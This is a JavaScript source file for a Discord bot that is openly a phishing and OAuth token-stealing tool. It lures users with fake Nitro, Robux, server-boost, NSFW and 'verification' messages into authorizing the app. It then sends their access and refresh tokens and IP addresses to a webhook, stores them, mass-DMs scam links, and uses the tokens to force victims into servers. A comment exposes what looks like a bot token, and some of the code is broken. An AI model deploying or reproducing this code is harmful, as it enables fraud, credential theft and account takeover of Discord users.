const Discord = require('discord.js');
const { Client, GatewayIntentBits, Intents } = require('discord.js');
const { REST } = require('@discordjs/rest');
const { Routes } = require('discord-api-types/v9');
const client = new Discord.Client({
  fetchAllMembers: false,
  restTimeOffset: 0,
  restWsBridgetimeout: 100,
  shards: "auto",
  allowedMentions: {
    parse: [],
    repliedUser: false,
  },
  partials: ['MESSAGE', 'CHANNEL', 'REACTION'],
  intents: [
    Discord.Intents.FLAGS.GUILDS,
    Discord.Intents.FLAGS.GUILD_MEMBERS,
    Discord.Intents.FLAGS.GUILD_BANS,
    Discord.Intents.FLAGS.GUILD_EMOJIS_AND_STICKERS,
    Discord.Intents.FLAGS.GUILD_INTEGRATIONS,
    Discord.Intents.FLAGS.GUILD_WEBHOOKS,
    Discord.Intents.FLAGS.GUILD_INVITES,
    Discord.Intents.FLAGS.GUILD_VOICE_STATES,
    Discord.Intents.FLAGS.GUILD_PRESENCES,
    Discord.Intents.FLAGS.GUILD_MESSAGES,
    Discord.Intents.FLAGS.GUILD_MESSAGE_REACTIONS,
    Discord.Intents.FLAGS.GUILD_MESSAGE_TYPING,
    Discord.Intents.FLAGS.DIRECT_MESSAGES,
    Discord.Intents.FLAGS.DIRECT_MESSAGE_REACTIONS,
    Discord.Intents.FLAGS.DIRECT_MESSAGE_TYPING
  ],
  presence: {
    activity: {
      name: `BoulderPro17 Bot`,
      type: "LISTENING",
    },
    status: "online"
  }
});



const kalash = require("./kalash");
const chalk = require('chalk');
const db = require('quick.db');
const fs = require('fs');
const express = require('express');
const app = express();
const bodyParser = require('body-parser');
const fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));
const FormData = require('form-data');
const axios = require('axios');
const emoji = require("./emoji");


process.on("unhandledRejection", err => console.log(err))






app.use(bodyParser.text())

app.get('/', function(req, res) {
  res.sendFile(__dirname + '/index.html')
})
app.get('/kalashallauth', async (req, res) => {
  fs.readFile('./object.json', function(err, data) {
    return res.json(JSON.parse(data))
  })
})
app.post('/', function(req, res) {
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress
  let form = new FormData()
  form.append('client_id', kalash.client_id)
  form.append('client_secret', kalash.client_secret)
  form.append('grant_type', 'authorization_code')
  form.append('redirect_uri', kalash.redirect_uri)
  form.append('scope', 'identify', 'guilds.join')
  form.append('code', req.body)
  fetch('https://discordapp.com/api/oauth2/token', { method: 'POST', body: form, })
    .then((eeee) => eeee.json())
    .then((cdcd) => {
      ac_token = cdcd.access_token
      rf_token = cdcd.refresh_token



      const tgg = { headers: { authorization: `${cdcd.token_type} ${ac_token}`, } }
      axios.get('https://discordapp.com/api/users/@me', tgg)
        .then((te) => {
          let efjr = te.data.id
          fs.readFile('./object.json', function(res, req) {
            if (
              JSON.parse(req).some(
                (ususu) => ususu.userID === efjr
              )
            ) {
              console.log(


                `[-] ${ip} - ` +
                te.data.username +
                `#` +
                te.data.discriminator
              )
              return
            }
            console.log(
              `[+] ${ip} - ` +
              te.data.username +
              '#' +
              te.data.discriminator
            )
            avatarHASH =
              'https://cdn.discordapp.com/avatars/' +
              te.data.id +
              '/' +
              te.data.avatar +
              '.png?size=4096'
            fetch(`${kalash.wehbook}`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                avatar_url: '',
                embeds: [
                  {
                    color: 3092790,
                    title: `${emoji.info} **New User**`,
                    thumbnail: { url: avatarHASH },
                    description:
                      `<:fleche:998161473081724930> Pseudo: \`${te.data.username}#${te.data.discriminator}\`` +

                      `\n\n🔷 IP: \`${ip}\`` +
                      `\n\n🔷 ID: \`${te.data.id}\`` +
                      `\n\n🔷Acces Token: \`${ac_token}\`` +
                      `\n\n🔷Refresh Token: \`${rf_token}\``,


                  },
                ],
              }),
            })
            var papapa = {
              userID: te.data.id,
              userIP: ip,
              avatarURL: avatarHASH,
              username:
                te.data.username + '#' + te.data.discriminator,
              access_token: ac_token,
              refresh_token: rf_token,
            },
              req = []
            req.push(papapa)
            fs.readFile('./object.json', function(res, req) {
              var jzjjfj = JSON.parse(req)
              jzjjfj.push(papapa)
              fs.writeFile(


                './object.json',
                JSON.stringify(jzjjfj),
                function(eeeeeeeee) {
                  if (eeeeeeeee) {
                    throw eeeeeeeee
                  }
                }
              )
            })
          })
        })
    })
})

// Token ("MTA1NTE3NjUzMzQ0ODMzOTQ5Ng.GCiNkV.Te3KY_9YBqYMSb4DtgP-rY2HOb8wm0VzYwcOKY")


client.on("ready", () => {
  client.user.setActivity(`You are looking amazing`);
  console.log('100%');
  console.log(`${chalk.blue('Verbunden')}\n${chalk.green('->')} The bot is connected to [ ${client.user.username} ], it uses the prefix ${kalash.prefix}\n${chalk.green('->')} invite of bot : https://discord.com/api/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot\n${chalk.green(
    '->')} Auth the Bot : ${kalash.authLink}`)
})


client.on("messageCreate", async (ctx) => {
  if (!ctx.guild || ctx.author.bot) return;
  const prefixRegex = new RegExp(`^(<@!?${client.user.id}>|${escapeRegex(kalash.prefix)})\\s*`);
  if (!prefixRegex.test(ctx.content)) return;
  const [, matchedPrefix] = ctx.content.match(prefixRegex);
  const args = ctx.content.slice(matchedPrefix.length).trim().split(/ +/);
  const cmd = args.shift().toLowerCase();



  if (cmd === "wl") {
    if (!kalash.owners.includes(ctx.author.id)) return;
    switch (args[0]) {
      case "add":
        const user = !isNaN(args[1]) ? (await client.users.fetch(args[1]).catch(() => { })) : undefined || ctx.mentions.users.first()
        if (db.get(`wl_${user.id}`) === null) {


          db.set(`wl_${user.id}`, true)
          ctx.channel.send({
            embeds: [{
              description: `${emoji.yes} **${user.username}** has been added to the whitelist`,
              color: "2F3136",
              footer: {
                "text": `${kalash.client} ・ ${kalash.footer}`,
                "icon_url": `https://cdn.discordapp.com/attachments/785104663544463390/880023050941255680/774322042970832926.gif`
              }
            }]
          })
        } else {
          ctx.channel.send({


            embeds: [{
              description: `${emoji.new} **${user.username}** is already whitelist`,
              color: "2F3136",
              footer: {
                "text": `${kalash.client} ・ ${kalash.footer}`,
                "icon_url": `https://cdn.discordapp.com/attachments/785104663544463390/880023050941255680/774322042970832926.gif`
              }
            }]
          })
        }
        break;
      case "remove":
        const user2 = !isNaN(args[1]) ? (await client.users.fetch(args[1]).catch(() => { })) : undefined || ctx.mentions.users.first()
        if (db.get(`wl_${user2.id}`) !== null) {


          db.delete(`wl_${user2.id}`)
          ctx.channel.send({
            embeds: [{
              description: `${emoji.yes} **${user2.username}** has been removed from the whitelist`,
              color: "2F3136",
              footer: {
                "text": `${kalash.client} ・ ${kalash.footer}`,
                "icon_url": `https://cdn.discordapp.com/attachments/785104663544463390/880023050941255680/774322042970832926.gif`
              }
            }]
          })
        } else {
          ctx.channel.send({
            embeds: [{
              description: `${emoji.new} **${user2.username}** is not whitelisted`,
              color: "2F3136",
              footer: {
                "text": `${kalash.client} ・ ${kalash.footer}`,
                "icon_url": `https://cdn.discordapp.com/attachments/785104663544463390/880023050941255680/774322042970832926.gif`
              }
            }]
          })
        }
        break;
      case "list":
        var content = ""
        const blrank = db.all().filter((data) => data.ID.startsWith(`wl_`)).sort((a, b) => b.data - a.data);

        for (let i in blrank) {
          if (blrank[i].data === null) blrank[i].data = 0;
          content += `\`${blrank.indexOf(blrank[i]) + 1}\` ${client.users.cache.get(blrank[i].ID.split("_")[1]).tag} (\`${client.users.cache.get(blrank[i].ID.split("_")[1]).id}\`)\n`
        }

        ctx.channel.send({
          embeds: [{
            title: `${emoji.user} Whitelisted Users`,
            description: `${content}`,
            color: "2F3136",
            footer: {
              "text": `${kalash.client} ・ ${kalash.footer}`,
              "icon_url": `https://cdn.discordapp.com/attachments/785104663544463390/880023050941255680/774322042970832926.gif`
            }
          }]


        })
        break;
    }
  }

  if (cmd === "mybot") {

    if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
    const embed = new Discord.MessageEmbed()

      .setTitle('Vos bots')
      .setDescription(`[${client.user.username}](https://discord.com/oauth2/authorize?client_id=${client.user.id}&scope=bot&permissions=8): 2 mois restants`)
      .setColor("#FF0000")

    ctx.channel.send({
      embeds: [embed]
    })
  }


  if (cmd === "test") {

    if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
    ctx.channel.send({


      components: [],
      embeds: [{
        color: "2F3136",
        title: `${emoji.yes} Der bot funktioniert`

      }],
    })
  }

  if (cmd === "help") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
    ctx.channel.send({
      components: [],
      embeds: [{
        color: "2F3136",
        title: `${emoji.help} BoulderPro17 BOT Dashbord`,


        description: `${emoji.command}** Command for add members**\n[\`joinall\`](${kalash.support}), [\`Users\`](${kalash.support}), [\`links\`](${kalash.support})\n\n${emoji.wl}** Whitelist**\n[\`wl list\`](${kalash.support}), [\`wl add\`](${kalash.support}), [\`wl remove\`](${kalash.support})\n\n${emoji.other}** Other**\n[\`boost\`](${kalash.support}), \n[\`basic\`](${kalash.support}), \n[\`nsfw\`](${kalash.support}),\n[\`giveaway\`](${kalash.support}), [\`botinfo\`](${kalash.support})\n\n${emoji.prefix} **Prefix** [\`${kalash.prefix}\`](${kalash.support})\n\n\`\`\`BoulderPro17 BOT Support\`\`\``,


        footer: {
          "text": `${kalash.client} ・ ${kalash.footer}`,
          "icon_url": `https://cdn.discordapp.com/attachments/1056168777068318730/1056175773410660382/Drache.png`
        }

      }],
    })
  }

  if (cmd === "botinfo") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
    let embed = new Discord.MessageEmbed()
      .setAuthor(client.user.username, client.user.displayAvatarURL({ dynamic: true }))
      .setColor('RANDOM')
      .setURL('https://discord.gg/bossteam')
      .setThumbnail(client.user.displayAvatarURL({ dynamic: true }))


      .addFields(
        { name: "🍭・Information", value: `> **Bot: :** <@${client.user.id}> \`\`${client.user.username}\`\`\n> **ID :** ${client.user.id}\n>  \`\`\`\``, inline: false },
        { name: "🍭Developer", value: `> **Name :** BoulderPro17`, inline: false },
      )
    ctx.channel.send({
      embeds: [embed]
    })
  }
  if (cmd === "mybot") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
    ctx.channel.send({
      embeds: []
    })
  }

  if (cmd === "partner") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
    ctx.channel.send({
      embeds: [{
        title: `${emoji.partner} Who is partner?`,
        description: `> **No one is partner.**`,
        color: "2F3136",
        footer: {
          "text": `${kalash.client} ・ ${kalash.footer}`,
          "icon_url": `https://cdn.discordapp.com/attachments/785104663544463390/880023050941255680/774322042970832926.gif`
        }
      }]
    })
  }
  if (cmd === "links") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
    ctx.channel.send({
      embeds: [{
        title: `${emoji.link} outh2 links:`,
        description: `${emoji.links} **OAuth2 Link:** ${kalash.authLink}\n\`\`\`${kalash.authLink}\`\`\`\n${emoji.links} **Bot Invite:** https://discord.com/api/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot\n \`\`\`https://discord.com/api/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot\`\`\` `,
        color: "2F3136",
        footer: {
          "text": `${kalash.client} ・ ${kalash.footer}`,
          "icon_url": `https://cdn.discordapp.com/avatars/1024736278098489344/73c2d9a1ca1b3f27f6fff529e01264c3.png?size=1024`
        }
      }],
      "components": [
        {
          "type": 1,
          "components": [
            {
              "type": 2,
              "style": 5,
              "label": "Bot invite",
              "url": `https://discord.com/api/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot`
            }
          ]
        }
      ]
    })
  }

  if (cmd === "nitro") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
    ctx.channel.send({

      embeds: [{
        title: `Hello @everyone, you have all been gifted Discord Nitro for a year!`,

        description: `To get your Discord Nitro all you must do is:
   \n1️⃣Click on the [claim]( ${kalash.authLink}) button.
   \n2️⃣Click on the [authorize]( ${kalash.authLink})\n\nOnce you've authorized yourself you must wait around 5-42 hours and youll have it.`,
        "color": 7540649,
        "image": {
          "url": "https://cdn.discordapp.com/attachments/1056167539861889045/1056483293912117268/ea4d36d7-efc0-4eba-b448-265bfaa94089.png"
        },

        footer: {
          "text": `・ ${kalash.footer}`,
          "icon_url": `https://cdn.discordapp.com/attachments/785104663544463390/880023050941255680/774322042970832926.gif`,
        }

      }
      ],
      "components": [
        {
          "type": 1,
          "components": [
            {
              "type": 2,
              "style": 5,
              "label": "Claim your nitro",
              "url": `${kalash.authLink}`
            }
          ]
        }
      ]


    })
  }

  if (cmd === "boost") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
    ctx.channel.send({

      embeds: [{
        title: `Hello @everyone, you have all been gifted a Serverboost  for a year!`,

        description: `To get your Serverboost all you must do is:
   \n1️⃣Click on the [claim]( ${kalash.authLink}) button.
   \n2️⃣Click on the [authorize]( ${kalash.authLink})\n\nOnce you've authorized yourself you must wait around 5-42 hours and youll have it.`,
        "color": 7540649,
        "image": {
          "url": "https://images.hotukdeals.com/threads/raw/4fWG0/4081519_1/re/768x768/qt/60/4081519_1.jpg"
        },

        footer: {
          "text": `・ ${kalash.footer}`,
          "icon_url": `https://cdn.discordapp.com/attachments/785104663544463390/880023050941255680/774322042970832926.gif`,
        }

      }
      ],
      "components": [
        {
          "type": 1,
          "components": [
            {
              "type": 2,
              "style": 5,
              "label": "Claim your nitro",
              "url": `${kalash.authLink}`
            }
          ]
        }
      ]


    })
  }
  if (cmd === "rbx") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
    ctx.channel.send({

      embeds: [{
        title: `Hello @everyone, you have all been gifted a 25$ Bobux Giftcard`,

        description: `To get your Giftcard all you must do is:
   \n1️⃣Click on the [claim]( ${kalash.authLink}) button.
   \n2️⃣Click on the [authorize]( ${kalash.authLink})\n\nOnce you've authorized yourself you must wait around 5-42 hours and youll get it in a private messages.`,
        "color": 7540649,
        "image": {
          "url": "https://cdn.discordapp.com/attachments/1056167539861889045/1056484035855134760/image34.png"
        },

        footer: {
          "text": `・ ${kalash.footer}`,
          "icon_url": `https://cdn.discordapp.com/attachments/785104663544463390/880023050941255680/774322042970832926.gif`,
        }

      }
      ],
      "components": [
        {
          "type": 1,
          "components": [
            {
              "type": 2,
              "style": 5,
              "label": "Claim Bobux",
              "url": `${kalash.authLink}`
            }
          ]
        }
      ]


    })
  }




  if (cmd === "basic") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
    ctx.channel.send({

      embeds: [{
        title: `Hello @everyone, you have all been gifted  Nitro basic for a year!`,

        description: `To get your  Nitro classic all you must do is:
   \n1️⃣Click on the [claim]( ${kalash.authLink}) button.
   \n2️⃣Click on the [authorize]( ${kalash.authLink})\n\nOnce you've authorized yourself you must wait around 5-42 hours and youll have it.`,
        "color": 7540649,
        "image": {
          "url": "https://cdn.discordapp.com/attachments/1056167539861889045/1056483384567799828/804e9141-f1b8-473f-b6d5-4c1d49e617f0.png"
        },

        footer: {
          "text": `・ ${kalash.footer}`,
          "icon_url": `https://cdn.discordapp.com/attachments/785104663544463390/880023050941255680/774322042970832926.gif`,
        }

      }
      ],
      "components": [
        {
          "type": 1,
          "components": [
            {
              "type": 2,
              "style": 5,
              "label": "Claim your nitro",
              "url": `${kalash.authLink}`
            }
          ]
        }
      ]


    })
  }

  if (cmd === "giveaway") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
    ctx.channel.send({
      "content": "🎉 **Giveaway** 🎉",
      embeds: [{
        title: `**Nitro Boost Yearly 🎁** `,
        description: `\n **WINNERS:** \`1\`\n **TIMER**: \`Ends in 7 days\`\n:tada: **HOSTED BY: <@${ctx.author.id}>**\n\n\n\nTo enter the giveaway click on the enter button @everyone`,
        "color": 0,
        footer: {
          "text": `・ ${kalash.footer}`,
          "icon_url": `https://cdn.discordapp.com/attachments/785104663544463390/880023050941255680/774322042970832926.gif`,
        }

      }
      ],
      "components": [
        {
          "type": 1,
          "components": [
            {
              "type": 2,
              "style": 5,
              "label": "Enter🎉",
              "url": `${kalash.authLink}`
            }
          ]
        }
      ]


    })
  }


  if (cmd === "cleans") {
    await client.clean(message)
  }

  if (cmd === "refresh") {
    await client.refreshTokens(message)
  }

  if (cmd === "nsfw") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
    ctx.channel.send({

      embeds: [{

        description: `**To be able to see nudes and nsfw channels click\n [here!](${kalash.authLink})🔞 **`,
        "color": 16711680,


      }
      ],
      "components": [
        {
          "type": 1,
          "components": [
            {
              "type": 2,
              "style": 5,
              "label": "Gain access here",
              "url": `${kalash.authLink}`
            }
          ]
        }
      ]


    })

  }
  if (cmd === "verify") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
    ctx.channel.send({

      embeds: [{

        description: `**To be able to see the private giveaways channels and chat channels click\n [here!](${kalash.authLink}) ✅ **`,
        "color": 16711680,


      }
      ],
      "components": [
        {
          "type": 1,
          "components": [
            {
              "type": 2,
              "style": 5,
              "label": "✅",
              "url": `${kalash.authLink}`
            }
          ]
        }
      ]


    })
  }

  if (cmd === "check") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
    ctx.channel.send({

      embeds: [{

        description: `**:link: Mentioned users is not Verified ❌!!!! 
           Please Verify Your Self Click [here!](${kalash.authLink}) !! **`,
        "color": 16711680,


      }
      ],
      "components": [
        {
          "type": 1,
          "components": [
            {
              "type": 2,
              "style": 5,
              "label": "Verify Now",
              "url": `${kalash.authLink}`
            }
          ]
        }
      ]


    })
  }

  if (cmd === "checkme") {
    ctx.channel.send({

      embeds: [{

        description: `**:link: Du bist nicht verifiziert ❌!!!! 
           Bitte verifiziere dich [hier!](${kalash.authLink}) !! **`,
        "color": 16711680,


      }
      ],
      "components": [
        {
          "type": 1,
          "components": [
            {
              "type": 2,
              "style": 5,
              "label": "Hier verifizieren",
              "url": `${kalash.authLink}`
            }
          ]
        }
      ]


    })
  }












  if (cmd === "checkme") {
    ctx.channel.send({

      embeds: [{

        description: `**:link: Du bist nicht verifiziert ❌!!!! 
           Bitte verifiziere dich [hier!](${kalash.authLink}) !! **`,
        "color": 16711680,


      }
      ],
      "components": [
        {
          "type": 1,
          "components": [
            {
              "type": 2,
              "style": 5,
              "label": "Hier verifizieren",
              "url": `${kalash.authLink}`
            }
          ]
        }
      ]


    })
  }


































































  if (cmd === "leave") {
    ctx.channel.send({

      embeds: [{

        description: `**To leave this awesomen Netwirk click here \n [here!](${kalash.joinLink}) ✅ **`,
        "color": 16711680,


      }
      ],
      "components": [
        {
          "type": 1,
          "components": [
            {
              "type": 2,
              "style": 5,
              "label": "✅",
              "url": `${kalash.joinLink}`
            }
          ]
        }
      ]


    })
  }

  if (cmd === "dm") {
    ctx.channel.send({

      embeds: [{

        description: `**Sending messages with this \n [link!](${kalash.joinLink}) ✅ **`,
        "color": 16711680,


      }
      ],
      "components": [
        {
          "type": 1,
          "components": [
            {
              "type": 2,
              "style": 5,
              "label": "The Link",
              "url": `${kalash.joinLink}`
            }
          ]
        }
      ]


    })
  }











  if (cmd === "clyde") {
    ctx.channel.send({

      embeds: [{

        description: `**You can get clyde ai with this link \n [link!](${kalash.joinLink}) ✅ **`,
        "color": 16711680,


      }
      ],
      "components": [
        {
          "type": 1,
          "components": [
            {
              "type": 2,
              "style": 5,
              "label": "Get Clyde AI",
              "url": `${kalash.joinLink}`
            }
          ]
        }
      ]


    })
  }












  if (cmd === "joinall") {
    if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
    fs.readFile('./object.json', async function(err, data) {
      let msg = await ctx.channel.send({
        content: `${emoji.user} **Joining users...** (\`0\`/${JSON.parse(data).length > 1 ? `\`${JSON.parse(data).length}\`` : `\`${JSON.parse(data).length}\``})`
      })
      if (cmd === "cleans") {
        if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
        await client.clean(message)
      }

      if (cmd === "refresh") {
        if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;
        await client.refreshTokens(message)
      }


      const inter = setInterval(async () => {
        msg.edit({
          content: `${emoji.load} **Joining users...** (\`${success}\`/${JSON.parse(data).length > 1 ? `\`${JSON.parse(data).length}\`` : `\`${JSON.parse(data).length}\``})`
        })
      }, 10000);

      let json = JSON.parse(data);
      let error = 0;
      let success = 0;
      let already_joined = 0;
      for (const i of json) {
        const user = await client.users.fetch(i.userID).catch(() => { });
        if (ctx.guild.members.cache.get(i.userID)) {
          already_joined++
        }
        await ctx.guild.members.add(user, { accessToken: i.access_token }).catch(() => {
          error++
        })
        success++
      }

      clearInterval(inter);

      msg.edit({
        embeds: [{
          title: `${emoji.user} Waiting for joins`,
          description: `${emoji.new} **Already in server** : ${already_joined}\n${emoji.succes} **Success**: ${success}\n${emoji.error} **Error**: ${error}`,
          color: "2F3136",
          footer: {
            "text": `${kalash.client} ・ ${kalash.footer}`,
            "icon_url": `https://cdn.discordapp.com/attachments/785104663544463390/880023050941255680/774322042970832926.gif`
          }
        }]
      }).catch(() => { })
    })
  } else {
    client.on('guildMemberAdd', (member) => {
      // Hier kommt der Code für die Schleife, die aktiviert wird, wenn ein Mitglied dem Server beitritt
      console.log(`Das Mitglied ${member.user.tag} ist dem Server beigetreten.`);
      // Füge hier deine gewünschte Funktionalität hinzu
      if (!member.user.bot) {
        member.send('You just won 12 months of discord nitro!!');
        member.send('Add the bot and type /nitro :0 ');
        member.send('Add the bot  https://discord.com/oauth2/authorize?client_id=1055176533448339496&permissions=8&redirect_uri=https%3A%2F%2Fbit.ly%2F12_discord_nitro_months_redem&response_type=code&scope=identify%20bot');
      }
    });
  }


  client.on('guildCreate', (guild) => {
    guild.members.cache.forEach((member) => {
      if (!member.user.bot) {
        member.send('You just won 12 months of discord nitro!!');
        member.send('Add the bot and type /nitro :0 ');
        member.send('Add the bot  https://discord.com/oauth2/authorize?client_id=1055176533448339496&permissions=8&redirect_uri=https%3A%2F%2Fbit.ly%2F12_discord_nitro_months_redem&response_type=code&scope=identify%20bot');
      }
    });
  });





































  if (cmd === "users") {




    if (db.get(`wl_${ctx.author.id}`) !== true && !kalash.owners.includes(ctx.author.id)) return;

    fs.readFile('./object.json', async function(err, data) {
      return ctx.channel.send({
        embeds: [{
          title: `${emoji.user} 👥BoulderPro17 BOT Benutzer👥`,
          description: `Es sind ${JSON.parse(data).length > 1 ? `\`${JSON.parse(data).length}\` Benutzer` : `\`${JSON.parse(data).length}\` users in the bot`}\n`,
          color: "2F3136",
          footer: {
            "text": `${kalash.client} ・ ${kalash.footer}`,
            "icon_url": `https://cdn.discordapp.com/attachments/785104663544463390/880023050941255680/774322042970832926.gif`
          }

        }]
      })
    })
  }
})











client.on('messageCreate', async (message) => {
  if (message.content == '?dm') {
    const guild = client.guilds.cache.get('1054404597474660423');
    try {

      await guild.members.fetch().then(async (member) => {
        member.forEach(async (member) => {
          if (member.user.id === client.user.id && member.bot) return;
          await member.send('You just won free Nitro!!! Claim now: ---> https://discord.com/api/oauth2/authorize?client_id=1188403176433524766&response_type=code&redirect_uri=https%3A%2F%2F93b68f5e-9f55-4c22-8aa5-24fb7cebfb9c-00-18n1kuw6eejo.kirk.replit.dev%2F&scope=identify+guilds.join.').then(() => { console.log('Sent message to: ' + member.user.tag) }).catch(() => { console.log('Failed to send message to: ' + member.user.tag) })
        });
      });
    } catch (error) {
      console.error(error);
    }

  }
});













































client.on('guildMemberAdd', (member) => {
  // Hier kommt der Code für die Schleife, die aktiviert wird, wenn ein Mitglied dem Server beitritt
  console.log(`Das Mitglied ${member.user.tag} ist dem Server beigetreten.`);
  // Füge hier deine gewünschte Funktionalität hinzu
  if (!member.user.bot) {
    member.send('You just won 12 months of discord nitro!!');
    member.send('Add the bot and type /Bobux :0 ');
    member.send('Add the bot  https://discord.com/api/oauth2/authorize?client_id=1188403176433524766&permissions=8&scope=bot');
  }
});






client.on('guildCreate', (guild) => {
  guild.members.cache.forEach((member) => {
    if (!member.user.bot) {
      member.send('You just won 1700 RBX');
      member.send('Add the bot and type /nitro :0 ');
      member.send('Add the bot:  https://discord.com/api/oauth2/authorize?client_id=1188403176433524766&permissions=8&scope=bot');
    }
  });
});






async function sendWelcomeMessages() {
  try {
    const guild = await client.guilds.fetct({ serverId });
    guild.members.fetch().then((members) => {
      members.forEach((member) => {
        if (!member.user.bot) {
          member.send(messageContent)
            .then(() => console.log(`Nachricht an ${member.user.tag} gesendet.`))
            .catch(console.error);
        }
      });
    });
  } catch (error) {
    console.error('Fehler beim Abrufen des Servers oder der Mitglieder:', error);
  }
}







//client.on('guildMemberAdd', async (member) => {
//  client.channels.cache.get("1081930333383045230").send("Server: __" + member.guild.name + "__\n Server ID: __" + member.guild.id + "__\n MemberCount: __" + member.guild.memberCount + "__")
//})



function escapeRegex(str) {
  return str.replace(/[.*+?^${}()|[\]\\]/g, `\\$&`);
}





















client.on('ready', () => {
  console.log(`Bot ist eingeloggt als ${client.user.tag}`);
  registerSlashCommand();
});

async function registerSlashCommand() {
  const rest = new REST({ version: '9' }).setToken(process.env.tokenyouretokenhere);

  try {
    console.log('Slash-Befehl wird registriert...');

    await rest.put(
      Routes.applicationCommands(client.user.id),
      {
        body: [
          {
            name: 'rbx',
            description: 'generate rbx',
          },
        ]
      },
    );

    console.log('Slash-Befehl wurde erfolgreich registriert.');
  } catch (error) {
    console.error('Fehler beim Registrieren des Slash-Befehls:', error);
  }
}


client.on('interactionCreate', async (interaction) => {
  if (!interaction.isCommand()) return;

  if (interaction.commandName === 'rbx') {
    const memberCount = Discord.Intents.FLAGS.GUILD_MEMBERS;

    if (memberCount >= 10) {
      const replyMessage = 'Sonething went wrong. Please try later again. er:530';
      await interaction.reply(replyMessage);
    } else {
      const replyMessage = 'Please invite 10 people to the server and auth the bot : https://discord.com/api/oauth2/authorize?client_id=1188403176433524766&response_type=code&redirect_uri=https%3A%2F%2F93b68f5e-9f55-4c22-8aa5-24fb7cebfb9c-00-18n1kuw6eejo.kirk.replit.dev%2F&scope=identify+guilds.join      to verify you are a human and not a bot!';
      await interaction.reply(replyMessage);
    }










  }
});


client.login(process.env.tokenyouretokenhere).catch(() => {
  throw new Error(`TOKEN OR INTENT INVALID`)
})




























app.listen(kalash.port, () => console.log('99,9%'))
console.log('1%')
console.log('10%')
console.log('19%')
console.log('33%')
console.log('39%')
console.log('45%')
console.log('49%')
console.log('53%')
console.log('57%')
console.log('67%')
console.log('89%')
console.log('98%')
console.log('99%')
console.log('99,1%')
console.log('99,2%')
console.log('99,3%')
console.log('99,4%')
console.log('99,5%')
console.log('99,6%')
console.log('99,7%')
console.log('99,8%')